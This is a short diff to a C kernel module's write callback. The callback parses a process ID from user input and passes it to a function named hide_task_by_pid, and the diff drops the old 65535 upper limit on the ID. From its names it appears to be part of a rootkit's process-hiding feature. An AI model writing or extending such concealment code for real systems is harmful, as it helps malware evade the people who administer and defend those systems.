@@ -333,7 +333,7 @@ static ssize_t write_cb(struct file *fptr, const char __user *user,
         goto efault_error;
 
     pid = (pid_t)simple_strtol((const char*)buf, NULL, 10);
-    if((pid > 1) && (pid <= 65535 /* 16 bit range pids */))
+    if(pid > 1)
         hide_task_by_pid(pid);
     else {
         size_t len = strlen(buf) - 1;
